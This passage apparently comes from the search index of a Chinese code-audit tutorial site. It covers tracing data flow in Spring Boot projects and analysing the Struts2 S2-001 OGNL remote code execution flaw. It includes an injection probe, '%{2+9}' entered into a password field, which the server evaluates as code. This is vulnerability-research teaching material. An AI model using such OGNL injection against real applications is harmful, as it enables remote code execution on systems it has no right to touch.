\u5f00\u53d1\u6846\u67b6\u5b89\u5168\u5ba1\u8ba1","text":""},{"location":"Code_audit/Java/Java-5/Spring%20Boot/index.html#_1","title":"\u5f00\u53d1\u6846\u67b6\u5ba1\u8ba1\u6280\u5de7","text":""},{"location":"Code_audit/Java/Java-5/Spring%20Boot/index.html#spring-boot","title":"Spring Boot \u6846\u67b6\u5ba1\u8ba1\u6280\u5de7","text":""},{"location":"Code_audit/Java/Java-5/Spring%20Boot/index.html#1spring-boot","title":"1\uff0eSpring Boot \u7b80\u4ecb","text":"<p>Spring Boot \u662f\u7531 Pivotal \u56e2\u961f\u5728 2013 \u5e74\u5f00\u59cb\u7814\u53d1\u30012014 \u5e74 4 \u6708\u53d1\u5e03\u7b2c\u4e00\u4e2a\u7248\u672c\u7684\u5168\u65b0\u3001\u5f00\u6e90\u7684\u8f7b\u91cf\u7ea7\u6846\u67b6\u3002\u5b83\u57fa\u4e8e Spring 4.0 \u8bbe\u8ba1\uff0c\u4e0d\u4ec5\u7ee7\u627f\u4e86 Spring \u6846\u67b6\u539f\u6709\u7684\u4f18\u79c0\u7279\u6027\uff0c\u800c\u4e14\u901a\u8fc7\u7b80\u5316\u914d\u7f6e\u8fdb\u4e00\u6b65\u7b80\u5316\u4e86 Spring \u5e94\u7528\u7684\u6574\u4e2a\u642d\u5efa\u548c\u5f00\u53d1\u8fc7\u7a0b\u3002\u53e6\u5916\uff0cSpring Boot \u901a\u8fc7\u96c6\u6210\u5927\u91cf\u7684\u6846\u67b6\u4f7f\u4f9d\u8d56\u5305\u7684\u7248\u672c\u51b2\u7a81\u4ee5\u53ca\u5f15\u7528\u7684\u4e0d\u7a33\u5b9a\u6027\u7b49\u95ee\u9898\u5f97\u5230\u4e86\u5f88\u597d\u7684\u89e3\u51b3\u3002</p>"},{"location":"Code_audit/Java/Java-5/Spring%20Boot/index.html#2","title":"2\uff0e\u5ba1\u8ba1\u601d\u8def","text":"<p>\u4f7f\u7528 Spring Boot \u6846\u67b6\u5ba1\u8ba1\u65f6\uff0c\u9996\u5148\u662f\u5c06\u524d\u9762\u4ecb\u7ecd\u7684 SSH \u548c SSM \u6240\u4f7f\u7528\u7684\u6848\u4f8b\u6539\u5199\u6210 Spring Boot \u7684\u5f62\u5f0f\u3002\u9879\u76ee\u6587\u4ef6\u7ed3\u6784\u5982\u56fe\u6240\u793a\uff0c\u6574\u4f53\u770b\u4e0a\u53bb\u4e0e SSM \u67b6\u6784\u7684 Demo \u975e\u5e38\u76f8\u4f3c\u3002</p> <p></p> <p>\u4ece\u6587\u4ef6\u7ed3\u6784\u4e2d\u53ef\u4ee5\u53d1\u73b0\uff0c\u4ee5\u5f80\u6211\u4eec\u5728\u5ba1\u8ba1\u8fc7\u7a0b\u4e2d\u6700\u5148\u6ce8\u610f\u5230\u7684 <code>web.xml</code>\u6587\u4ef6\u5728<code>Spring Boot</code>\u4e2d\u88ab\u53d6\u6d88\uff0c\u90a3\u4e48\u5ba1\u8ba1\u5982\u4f55\u5f00\u59cb\u5462\uff1f<code>Spring Boot</code> \u5f00\u53d1\u7684\u9879\u76ee\u90fd\u6709\u4e00\u4e2a\u4e3b\u914d\u7f6e\u7c7b\uff0c\u901a\u5e38\u653e\u7f6e\u4e8e\u5305\u7684\u6700\u5916\u5c42\uff0c\u5f53\u524d\u9879\u76ee\u7684\u4e3b\u914d\u7f6e\u7c7b\u662f <code>SpringbootdemoApplication</code>\u7c7b\uff0c\u5176\u4ee3\u7801\u5982\u56fe\u3002</p> <p></p> <p>\u518d\u67e5\u770b\u914d\u7f6e\u6587\u4ef6 <code>application.properties</code>\uff0c\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u5176\u4e2d\u53ea\u914d\u7f6e\u4e86<code>jdbc</code>\u7684\u94fe\u63a5\u4fe1\u606f\uff0c\u4ee5\u53ca\u4e00\u4e2a\u7c7b\u4f3c<code>mybatis</code>\u914d\u7f6e\u6587\u4ef6\u5b58\u653e\u76ee\u5f55\u7684\u4fe1\u606f\u3002</p> <p>\u770b\u5230\u8fd9\u91cc\uff0c\u8c8c\u4f3c\u5ba1\u8ba1\u8fdb\u5165\u4e86\u4e00\u4e2a\u6b7b\u80e1\u540c\uff0c\u5982\u679c\u4e0d\u6e05\u695a <code>Spring Boot</code>\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u5ba1\u8ba1\u5c31\u65e0\u6cd5\u7ee7\u7eed\u8fdb\u884c\u3002\u8fd9\u65f6\u5c31\u9700\u8981\u4e86\u89e3<code>Spring Boot</code> \u975e\u5e38\u5173\u952e\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u2014\u2014\u81ea\u52a8\u88c5\u914d\u3002</p> <p>Spring Boot \u9879\u76ee\u7684\u4e3b\u914d\u7f6e\u7c7b SpringbootdemoApplication \u6709\u4e00\u4e2a\u6ce8\u89e3\u4e3a<code>@SpringBootApplication</code>\uff0c\u5f53\u4e00\u4e2a\u7c7b\u4e0a\u5b58\u5728\u8be5\u6ce8\u89e3\u65f6\uff0c\u8be5\u7c7b\u624d\u662f Spring Boot \u7684\u4e3b\u914d\u7f6e\u7c7b\u3002\u5f53 Spring Boot \u7a0b\u5e8f\u6267\u884c\u65f6\uff0c\u626b\u63cf\u5230\u8be5\u6ce8\u89e3\u540e\uff0c\u4f1a\u5bf9\u8be5\u7c7b\u5f53\u524d\u6240\u5728\u76ee\u5f55\u4ee5\u53ca\u6240\u6709\u5b50\u76ee\u5f55\u8fdb\u884c\u626b\u63cf\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 SpringbootdemoApplication \u8fd9\u4e2a\u4e3b\u914d\u7f6e\u7c7b\u4e00\u5b9a\u8981\u5199\u5728\u5305\u4e2d\u6240\u6709\u7c7b\u7684\u6700\u5916\u9762\uff0c\u56e0\u6b64\u7701\u7565\u4e86\u4e4b\u524d\u5728 SSH \u4ee5\u53ca SSM \u4e2d\u7684\u79cd\u79cd XML \u914d\u7f6e\u3002\u8bb2\u5230\u8fd9\u91cc\uff0c\u76f8\u4fe1\u8bfb\u8005\u5e94\u8be5\u610f\u8bc6\u5230\u6211\u4eec\u5728 SSH \u9879\u76ee\u4ee5\u53ca SSM \u9879\u76ee\u4e2d\u901a\u8fc7 XML \u914d\u7f6e\u7684\u4fe1\u606f\uff0c\u5728\u8fd9\u91cc\u90fd\u8981\u6539\u4e3a\u4f7f\u7528\u6ce8\u89e3\u6765\u8fdb\u884c\u914d\u7f6e\u3002</p> <p>\u4e86\u89e3\u8fd9\u4e00\u70b9\u4e4b\u540e\uff0c\u5ba1\u8ba1\u7684\u601d\u8def\u4f3c\u4e4e\u6e05\u6670\u4e86\u8d77\u6765\u3002\u6839\u636e MVC \u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u9664\u4e86Filter \u548c Listener \u4ee5\u5916\uff0c\u9996\u5148\u5728\u63a5\u6536\u524d\u7aef\u4f20\u5165\u53c2\u6570\u7684\u5c31\u662f Controller \u5c42\u3002Controller \u5c42\u7684\u5185\u5bb9\u5982\u56fe\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u5176\u4e2d\u7684\u4ee3\u7801\u4e0e\u4f7f\u7528 SSM \u4e66\u5199\u65f6\u5b8c\u5168\u76f8\u540c\uff0c\u8fd9\u91cc\u4ee5\u6839\u636e ID \u67e5\u8be2\u4e66\u7c4d\u7684\u529f\u80fd\u4e3a\u4f8b\u6765\u8fdb\u884c\u8bb2\u89e3\u3002\u540c\u5ba1\u8ba1 SSH \u548c SSM \u6846\u67b6\u65f6\u7684\u601d\u8def\u76f8\u540c\uff0c<code>Controller</code>\u5c42\u7684<code>queryBookById</code> \u65b9\u6cd5\u5728\u63a5\u6536\u5230\u524d\u7aef\u4f20\u5165\u7684 ID \u53c2\u6570\u540e\uff0c\u8c03\u7528\u4e86 <code>Service</code> \u5c42\u6765\u5bf9 ID \u53c2\u6570\u8fdb\u884c\u5904\u7406\uff0c\u6240\u4ee5\u8ddf\u8fdb <code>BookService</code>\uff0c\u5982\u56fe</p> <p></p> <p><code>BookService</code> \u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u8be5\u63a5\u53e3\u53ea\u6709\u4e00\u4e2a\u5b9e\u73b0\u7c7b\uff0c\u6240\u4ee5\u5230 <code>BookServiceImpl</code>\u7c7b\u4e2d\u8fdb\u884c\u89c2\u5bdf\uff0c<code>BookServiceImpl</code> \u7c7b\u7684\u90e8\u5206\u4ee3\u7801\u5982\u56fe</p> <p></p> <p>Service \u5c42\u5e76\u6ca1\u6709\u505a\u66f4\u591a\u7684\u64cd\u4f5c\uff0c\u53ea\u662f\u7b80\u5355\u8c03\u7528\u4e86 DAO \u5c42\u7684 BookMapper\uff0c\u5e76\u5c06ID \u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u8fdb\u53bb\uff0c\u6240\u4ee5\u6211\u4eec\u7ee7\u7eed\u8ffd\u8e2a BookMapper\u3002</p> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0cBookMapper \u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u4e14\u6839\u636e\u4e0b\u56fe\u6240\u793a\uff0cBookMapper\u5e76\u6ca1\u6709\u5b9e\u73b0\u7c7b\uff0c\u90a3\u4e48\u7a0b\u5e8f\u662f\u5982\u4f55\u8c03\u7528 BookMapper \u4e2d\u5b9a\u4e49\u7684\u65b9\u6cd5\u7684\u5462\uff1f\u8fd9\u91cc\u7684 DAO\u5c42\u4f7f\u7528\u7684\u662f MyBatis \u6846\u67b6\uff0cMyBaits \u6846\u67b6\u5728\u914d\u7f6e\u548c\u6570\u636e\u5c42\u4ea4\u4e92\u65f6\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a\u4e00\u79cd\u662f\u901a\u8fc7\u5728\u63a5\u53e3\u65b9\u6cd5\u4e0a\u76f4\u63a5\u4f7f\u7528\u6ce8\u89e3\uff0c\u8fd8\u6709\u4e00\u79cd\u5c31\u662f\u4f7f\u7528 XML \u6765\u8fdb\u884c\u914d\u7f6e\u3002\u5f88\u660e\u663e\uff0c\u6211\u4eec\u5728 BookMapper \u7684\u65b9\u6cd5\u4e2d\u6ca1\u6709\u770b\u5230\u76f8\u5173\u6ce8\u89e3\uff0c\u56e0\u6b64\u5e94\u8be5\u641c\u7d22\u76f8\u5173\u7684 XML \u914d\u7f6e\u6587\u4ef6\u3002</p> <p></p> <p>\u9879\u76ee\u7684 resource \u76ee\u5f55\u4e0b\u5b58\u653e\u6709 BookMapper \u7684 XML \u914d\u7f6e\u6587\u4ef6\uff0c\u5176\u90e8\u5206\u5185\u5bb9\u5982\u4e0b\u56fe\u6240\u793a\u3002\u540c\u6837\u5728\u5ba1\u8ba1\u8fc7\u7a0b\u8981\u6ce8\u610f\u7a0b\u5e8f\u5728\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\u65f6\u6709\u6ca1\u6709\u4f7f\u7528\u9884\u7f16\u8bd1\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5219\u9700\u8981\u6ce8\u610f\u4f20\u5165\u6570\u636e\u5e93\u7684\u53c2\u6570\u662f\u5426\u7ecf\u8fc7\u8fc7\u6ee4\u548c\u6821\u9a8c\u3002</p> <p></p> <p>\u4ee5\u4e0a\u5c31\u662f\u4e00\u4e2a\u4f7f\u7528 Spring Boot \u642d\u5efa\u7b80\u5355\u7684 Web \u9879\u76ee\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u7ecf\u8fc7\u62c6\u89e3\u548c\u5206\u6790\u53d1\u73b0 Spring Boot \u7684\u6267\u884c\u6d41\u7a0b\u548c SSM \u7684\u5927\u81f4\u76f8\u540c\uff0c\u5dee\u522b\u53ea\u662f Spring Boot \u6784\u5efa\u7684 Web\u9879\u76ee\u4e2d\u7f3a\u5c11\u5f88\u591a\u914d\u7f6e\u6587\u4ef6\u3002</p>"},{"location":"Code_audit/Java/Java-5/s2-001/index.html","title":"\u5f00\u53d1\u6846\u67b6\u4f7f\u7528\u4e0d\u5f53\u8303\u4f8b(S2-001 \u6f0f\u6d1e\u539f\u7406\u5206\u6790)","text":"<p>\u81ea Struts2 \u5728 2007 \u5e74\u7206\u51fa\u7b2c\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e S2-001 \u4ee5\u6765\uff0c\u5728\u5176\u540e\u7eed\u7684\u53d1\u5c55\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u7206\u51fa\u66f4\u591a\u800c\u4e14\u5371\u5bb3\u66f4\u5927\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u800c\u9020\u6210 Struts2 \u8fd9\u4e48\u591aRCE \u6f0f\u6d1e\u7684\u4e3b\u8981\u539f\u56e0\u5c31\u662f OGNL \u8868\u8fbe\u5f0f\u3002\u8fd9\u91cc\u4ee5 Struts2 \u7684\u7b2c\u4e00\u4e2a\u6f0f\u6d1e S2-001 \u4e3a\u4f8b\u6765\u5bf9 Struts2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u8fdb\u884c\u521d\u6b65\u4ecb\u7ecd\u3002</p>"},{"location":"Code_audit/Java/Java-5/s2-001/index.html#ognl","title":"OGNL \u7b80\u4ecb","text":"<p>\u9996\u5148\u6765\u4e86\u89e3OGNL\u8868\u8fbe\u5f0f\uff0cOGNL(Object Graphic Navigatino Language)\u7684\u4e2d\u6587\u5168\u79f0\u4e3a\"\u5bf9\u8c61\u56fe\u5f62\u5bfc\u822a\u8bed\u8a00\"\uff0c\u4e0b\u9762\u5148\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u6848\u4f8b\u6765\u63cf\u8ff0\u5176\u4f5c\u7528\u3002</p> <p>\u9996\u5148\u5b9a\u4e49\u4e00\u4e2a Student \u7c7b\uff0c\u8be5\u7c7b\u6709 3 \u4e2a\u5c5e\u6027 name\u3001studentNumber \u548c theClass\uff0c\u540c\u65f6\u4e3a 3 \u4e2a\u5c5e\u6027\u7f16\u5199 get \u548c set \u65b9\u6cd5\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>\u7136\u540e\u5b9a\u4e49\u4e00\u4e2a TheClass \u7c7b\uff0c\u8be5\u7c7b\u6709\u4e24\u4e2a\u5c5e\u6027\uff1aclassName \u548c school\uff0c\u540c\u6837\u4e5f\u4e3a\u4e24\u4e2a\u5c5e\u6027\u7f16\u5199 get \u548c set \u65b9\u6cd5\uff0c\u5982\u56fe</p> <p></p> <p>\u6700\u540e\u5b9a\u4e49\u4e00\u4e2a School \u7c7b\uff0c\u8be5\u7c7b\u53ea\u6709\u4e00\u4e2a\u5c5e\u6027 schoolName\uff0c\u5982\u56fe</p> <p></p> <p>\u901a\u8fc7\u5982\u4e0b\u64cd\u4f5c\u5c06\u8fd9 3 \u4e2a\u7c7b\u5b9e\u4f8b\u5316\u5e76\u4e3a\u5176\u5c5e\u6027\u4e00\u4e00\u8fdb\u884c\u8d4b\u503c\uff0c\u6700\u540e\u901a\u8fc7\u4f7f\u7528 OGNL\u8868\u8fbe\u5f0f\u7684\u65b9\u5f0f\u53d6\u51fa\u6307\u5b9a\u7684\u503c\uff0c\u5982\u56fe</p> <p></p> <p>\u5728\u4e0d\u4f7f\u7528 OGNL \u8868\u8fbe\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u8981\u53d6\u51fa schoolName \u5c5e\u6027\uff0c\u9700\u8981\u901a\u8fc7\u8c03\u7528\u5bf9\u5e94\u7684 get \u65b9\u6cd5\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u4f7f\u7528 OGNL \u7684 getValue\uff0c\u53ea\u9700\u8981\u4f20\u9012\u4e00\u4e2a OGNL \u8868\u8fbe\u5f0f\u548c\u6839\u8282\u70b9\u5c31\u53ef\u4ee5\u53d6\u51fa\u6307\u5b9a\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u975e\u5e38\u65b9\u4fbf\u3002</p>"},{"location":"Code_audit/Java/Java-5/s2-001/index.html#s2-001_1","title":"S2-001 \u6f0f\u6d1e\u539f\u7406\u5206\u6790","text":"<p>\u521d\u6b21\u4e86\u89e3\u4e00\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\uff0c\u9664\u4e86\u67e5\u770b\u7f51\u7edc\u4e0a\u76f8\u5173\u7684\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0\u4ee5\u5916\uff0c\u6700\u91cd\u8981\u7684\u4e00\u70b9\u5c31\u662f\u4e00\u5b9a\u8981\u81ea\u5df1\u8c03\u8bd5\u3002</p> <p>\u9996\u5148\u5bfc\u5165\u5b58\u5728\u6f0f\u6d1e\u7684 Jar \u5305\u3002</p> <p></p> <p>\u9996\u5148\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7684java\u9879\u76ee\uff0c\u7136\u540e\u518d\u5f15\u5165\u6240\u9700\u7684jar\u5305\u3002</p> <p></p> <p>\u7136\u540e\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684 Demo\uff0c\u9996\u9875\u7684\u90e8\u5206\u4ee3\u7801\u5982\u56fe</p> <p></p> <p>\u8fd0\u884c\u4e0a\u8ff0\u4ee3\u7801\u5f97\u5230\u4e00\u4e2a\u7b80\u5355\u7684\u767b\u5f55\u6846\uff0c\u63a5\u4e0b\u6765\u662f\u8d1f\u8d23\u5904\u7406\u8bf7\u6c42\u7684 Action \u4ee3\u7801\uff0c\u5982\u56fe</p> <p></p> <p>\u7136\u540e\u662f Struts2 \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5982\u56fe</p> <p></p> <p>\u6839\u636e\u4e0a\u8ff0\u4ee3\u7801\u53ef\u77e5\uff0cLoginAction \u6240\u505a\u7684\u5c31\u662f\u5224\u65ad username \u548c password \u662f\u5426\u4e3a\u7a7a\u4ee5\u53ca\u662f\u5426\u90fd\u4e3a admin\uff0c\u5982\u679c\u90fd\u6ee1\u8db3\u5219\uff0c\u8fd4\u56de\u201csuccess\u201d\u8f6c\u53d1\u5230 welcome.jsp\u3002\u5176\u4e2d\u4e00\u9879\u4e0d\u6ee1\u8db3\uff0c\u5219\u8fd4\u56de\u201cerror\u201d\u8f6c\u53d1\u5230 index.jsp\u3002</p> <p>\u9996\u5148\u6765\u7b80\u5355\u4e86\u89e3 Struts2 \u7684\u6267\u884c\u6d41\u7a0b\u3002\u5b98\u65b9\u63d0\u4f9b\u7684 Struts2 \u7684\u67b6\u6784\u5982\u56fe\uff1a</p> <p></p> <pre><code>Servlet Filters\uff1a\u8fc7\u6ee4\u5668\u94fe\uff0c\u5ba2\u6237\u7aef\u7684\u6240\u6709\u8bf7\u6c42\u90fd\u8981\u7ecf\u8fc7 Filter \u94fe\u7684\u5904\u7406\u3002\nStruts Core\uff1aStruts2 \u7684\u6838\u5fc3\u90e8\u5206\u3002\nInterceptors\uff1aStruts2 \u7684\u62e6\u622a\u5668\u3002Struts2 \u63d0\u4f9b\u4e86\u5f88\u591a\u9ed8\u8ba4\u7684\u62e6\u622a\u5668\uff0c\u53ef\u4ee5\u5b8c\u6210\u65e5\u5e38\u5f00\u53d1\u7684\u7edd\u5927\u90e8\u5206\u5de5\u4f5c\uff1b\u800c\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u62e6\u622a\u5668\u7528\u6765\u5b9e\u73b0\u5b9e\u9645\u7684\u5ba2\u6237\u4e1a\u52a1\u9700\u8981\u7684\u529f\u80fd\u3002\nUser created\uff1a\u7531\u5f00\u53d1\u4eba\u5458\u521b\u5efa\uff0c\u5305\u62ec struts.xml\u3001Action\u3001Template\u3002\n</code></pre> <p>\u7528\u6237\u4f1a\u9996\u5148\u53d1\u8d77\u4e00\u4e2a\u9488\u5bf9\u67d0\u4e2a Action \u7684\u8bf7\u6c42\uff0c\u540e\u53f0\u7684 Servlet \u5bb9\u5668\uff0c\u4f8b\u5982 Tomcat\u63a5\u6536\u5230\u8be5\u8bf7\u6c42\u540e\u4f1a\u53bb\u52a0\u8f7d web.xml\uff0c\u6839\u636e web.xml \u4e2d\u914d\u7f6e\u7684 Filter\uff0c\u6700\u540e\u4f1a\u6267\u884c\u5230FilterDispatcher \u5373 Struts2 \u7684\u8c03\u5ea6\u4e2d\u5fc3\uff0c\u5982\u56fe</p> <p></p> <p>\u5728 web.xml \u4e2d\uff0cFilterDispatcher \u901a\u5e38\u4f1a\u914d\u7f6e\u5728 Filter \u94fe\u7684\u6700\u540e\u3002\u6839\u636e\u5b98\u65b9\u63d0\u4f9b\u7684 Struts2 \u7684\u67b6\u6784\u56fe\u4e2d\u7684\u6d41\u7a0b\uff0cFilterDispatcher \u4f1a\u5c06\u8bf7\u6c42\u4ea4\u7531 ActionMapper \u8fdb\u884c\u5904\u7406\uff0c\u800c ActionMapper \u5219\u8d1f\u8d23\u5224\u65ad\u5f53\u524d\u7684\u8bf7\u6c42\u662f\u5426\u4ea4\u7531 Struts2 \u6765\u8fdb\u884c\u5904\u7406\u3002\u5982\u679c\u7ecf\u8fc7\u5224\u65ad\u9700\u8981 Struts2 \u5904\u7406\uff0cFilterDispatcher\u4f1a\u7ed3\u675fFilterChain\u7684\u6267\u884c\uff0c\u6240\u4ee5\u9700\u8981\u5c06FilterDispatcher\u5199\u5728FilterChain\u7684\u6700\u540e\u3002\u76f8\u5173\u4ee3\u7801\u5982\u56fe</p> <p></p> <p>\u5f53 mapping \u4e0d\u4e3a\u7a7a\u65f6\uff0c\u5219\u8fdb\u5165\u4e0b\u4e00\u4e2a\u6b65\u9aa4\uff0c\u5373\u521b\u5efa\u4e00\u4e2a ActionProxy\u3002ActionProxy\u5bf9\u8c61\u5728\u521b\u5efa\u7684\u540c\u65f6\u4f1a\u901a\u8fc7\u8c03\u7528 ConfigurationManager \u5bf9\u8c61\u6765\u83b7\u53d6 Struts.xml \u4e2d\u7684Action \u914d\u7f6e\uff0c\u8fd9\u6837 ActionProxy \u624d\u80fd\u6e05\u695a\u540e\u7eed\u5e94\u8be5\u8c03\u7528\u54ea\u4e9b\u62e6\u622a\u5668\u548c\u54ea\u4e2a Action\uff0c\u6700\u7ec8\u751f\u6210\u7684 ActionProxy \u5bf9\u8c61\u5982\u56fe</p> <p></p> <p>\u5f53\u8bfb\u53d6\u5230\u8fd9\u4e9b\u4fe1\u606f\u540e\uff0cActionProxy \u4f1a\u521b\u5efa\u4e00\u4e2a ActionInvocation \u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u9996\u5148\u4f1a\u4f9d\u6b21\u8c03\u7528 Struts2 \u4e2d\u9ed8\u8ba4\u7684\u62e6\u622a\u5668\uff0c\u6240\u6709\u7684\u9ed8\u8ba4\u62e6\u622a\u5668\u90fd\u5b58\u50a8\u5728 ActionInvocation\u5bf9\u8c61\u7684 interceptors \u5c5e\u6027\u4e2d\uff0c\u5e76\u901a\u8fc7 hasNext \u65b9\u6cd5\u4f9d\u6b21\u8fdb\u884c\u8c03\u7528\uff0c\u76f8\u5173\u4ee3\u7801\u5982\u56fe</p> <p></p> <p>\u90a3\u4e48 Struts2 \u9ed8\u8ba4\u7684\u62e6\u622a\u5668\u90fd\u6709\u54ea\u4e9b\uff0c\u5e76\u4e14\u5b9a\u4e49\u5728\u54ea\u91cc\u5462\uff1fStrut2-core.jar \u5305\u4e2d\u6709\u4e00\u4e2a struts2-default.xml \u6587\u4ef6\uff0c\u8fd9\u91cc\u914d\u7f6e\u4e86 Struts2 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8981\u6267\u884c\u7684\u62e6\u622a\u5668\uff0c\u5982\u56fe</p> <p></p> <p>\u63a5\u4e0b\u6765\uff0cActionInvocation \u5bf9\u8c61\u4f1a\u4f9d\u6b21\u6267\u884c\u4e0a\u8ff0\u7684\u62e6\u622a\u5668\uff0c\u5e76\u6700\u7ec8\u8c03\u7528\u7528\u6237\u81ea\u5df1\u7f16\u5199\u7684 Action\u3002</p> <p>\u5f53\u62e6\u622a\u5668\u6267\u884c\u5b8c\u6210\u540e\uff0c\u9996\u5148\u5c31\u4f1a\u8c03\u7528\u5f00\u53d1\u8005\u7f16\u5199\u7684 Action \u4e2d\u7684 execute \u65b9\u6cd5\uff0c\u6267\u884c\u5b8c\u8be5\u65b9\u6cd5\u540e\uff0c\u4f1a\u6839\u636e Struts.xml \u914d\u7f6e\u7684\u4fe1\u606f\u53bb\u67e5\u627e\u5bf9\u5e94\u7684\u6a21\u677f\u9875\u9762\uff0c\u4f8b\u5982 JSP\u3001FreeMarker\uff1b\u7136\u540e\u6839\u636e\u5bf9\u5e94\u7684\u6a21\u677f\u6807\u7b7e\u4fe1\u606f\uff0c\u89e3\u6790\u6210 HTML \u7b49\u6d4f\u89c8\u5668\u53ef\u4ee5\u89e3\u6790\u7684\u9875\u9762\u4fe1\u606f\u540e\uff0c\u518d\u6309\u7167\u9ed8\u8ba4\u62e6\u622a\u5668\u7684\u76f8\u53cd\u987a\u5e8f\u6267\u884c\uff1b\u6700\u7ec8\u5c06\u9875\u9762\u4fe1\u606f\u5c01\u88c5\u81f3 Response \u4e2d\u3002\u8fd9\u5c31\u662f Strut2 \u5904\u7406\u4e00\u6b21\u7528\u6237\u53d1\u6765\u7684\u8bf7\u6c42\u5176\u5e95\u5c42\u4ee3\u7801\u6267\u884c\u7684\u6d41\u7a0b\u3002</p> <p>\u4e86\u89e3\u8fd9\u4e2a\u6d41\u7a0b\u4e4b\u540e\u5c31\u53ef\u4ee5\u5206\u6790 Struts2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u7684\u539f\u7406\u4e86\u3002\u9996\u5148\u8fd0\u884c\u5305\u542b S2-001 \u6f0f\u6d1e\u7684\u7a0b\u5e8f\uff0c\u8f93\u5165\u4ee5\u4e0b\u6570\u636e\uff0c\u5982\u56fe</p> <p></p> <p>\u5355\u51fb Submit \u6309\u94ae\u540e\uff0cpassword \u4e00\u680f\u5c31\u4f1a\u53d8\u6210 2+9 \u7684\u8ba1\u7b97\u7ed3\u679c\uff0c\u5982\u56fe</p> <p></p> <p>\u8fd9\u610f\u5473\u7740\uff0c\u540e\u53f0\u5c06 password \u4e2d%{2+9}\u4f5c\u4e3a\u4ee3\u7801\u6267\u884c\uff0c\u5e76\u8fd4\u56de\u4e86\u8ba1\u7b97\u7ed3\u679c\u3002</p> <p>\u62e6\u622a\u5668\u7684\u6267\u884c\u6d41\u7a0b\u662f\uff1a\u9996\u5148\uff0c\u9700\u8981\u5224\u65ad%{2+9}\u662f\u5728\u4f55\u65f6\u88ab\u6267\u884c\u7684\uff0c\u5c06\u65ad\u70b9\u8bbe\u7f6e\u5728 <code>LoginAction</code> \u7684 <code>setPassword</code> \u548c <code>getPassword</code> \u65b9\u6cd5\u4e0a\uff0c\u5982\u56fe\u6240\u793a\uff1b\u7136\u540e\uff0c\u56e0\u4e3a\u5728Struts2 \u6267\u884c\u4f17\u591a\u7684\u9ed8\u8ba4\u62e6\u622a\u5668\u65f6\uff0c\u6709\u4e00\u4e2a\u540d\u4e3a<code>params</code> \u7684\u62e6\u622a\u5668\uff0c\u8be5\u62e6\u622a\u5668\u5bf9\u5e94\u7684\u6743\u9650\u5b9a\u7c7b\u540d\u662f <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor</code>\uff0c\u8be5\u62e6\u622a\u5668\u4f1a\u901a\u8fc7\u8c03\u7528\u5bf9\u5e94 Action \u7684 setter \u65b9\u6cd5\u6765\u4e3a\u5176\u5c5e\u6027\u8fdb\u884c\u8d4b\u503c\uff1b\u6700\u540e\uff0c\u5bf9\u8d4b\u503c\u8fdb\u884c\u5224\u65ad\uff0c\u5982\u679c password \u7684\u503c\u4e3a\u201c%{2+9}\u201d\uff0c\u5219\u8bc1\u660e\u4ee3\u7801\u6267\u884c\u7684\u884c\u4e3a\u53d1\u751f\u5728\u6267\u884c Action \u4e4b\u540e\uff1b\u5982\u679c password \u7684\u503c\u4e3a 11\uff0c\u5219\u8bc1\u660e\u4ee3\u7801\u6267\u884c\u7684\u884c\u4e3a\u53d1\u751f\u5728 Action \u6267\u884c\u4e4b\u524d\u3002\u901a\u8fc7\u8fd9\u79cd\u7b80\u5355\u7684\u5224\u65ad\u5c31\u53ef\u4ee5\u51cf\u5c11\u6f0f\u6d1e\u70b9\u7684\u641c\u7d22\u8303\u56f4\uff0c\u5982\u56fe</p> <p></p> <p>\u901a\u8fc7\u5728\u6b64\u5904\u8bbe\u7f6e\u65ad\u70b9\uff0c\u53ef\u4ee5\u770b\u5230\u76f4\u5230\u8d4b\u503c\u5b8c\u6210\uff0c\u201c%{2+9}\u201d\u4ecd\u6ca1\u6709\u88ab\u6267\u884c\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u622a\u6b62\u5230\u6267\u884c\u5b8c ParametersInterceptor \u62e6\u622a\u5668\u4e3a\u6b62\uff0c\u6ca1\u6709\u4ee3\u7801\u6267\u884c\u7684\u884c\u4e3a\u53d1\u751f\u3002</p> <p>\u63a5\u4e0b\u6765\u662f\u6267\u884c Action \u7684 execute \u65b9\u6cd5\uff0c\u6700\u7ec8\u7ed3\u679c\u662f\u8fd4\u56de\u201cerror\u201d\u5b57\u7b26\u4e32\uff0c\u5982\u56fe</p> <p></p> 